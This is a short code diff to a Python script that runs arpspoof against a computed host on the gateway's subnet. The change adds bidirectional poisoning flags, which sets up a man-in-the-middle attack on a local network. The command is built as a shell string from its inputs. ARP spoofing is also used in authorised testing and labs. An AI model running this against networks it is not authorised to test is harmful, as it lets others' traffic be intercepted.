@@ -9,7 +9,7 @@ import time
 def run_arpspoof(ip, gateway):
     part = ".".join(gateway.split(".")[:3]) + "."
     ip_total = part + str(ip)
-    command = f"sudo arpspoof -i {interface} -t {ip_total} {gateway}"
+    command = f"sudo arpspoof -i {interface} -r -c both -t {ip_total} {gateway}"
 
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
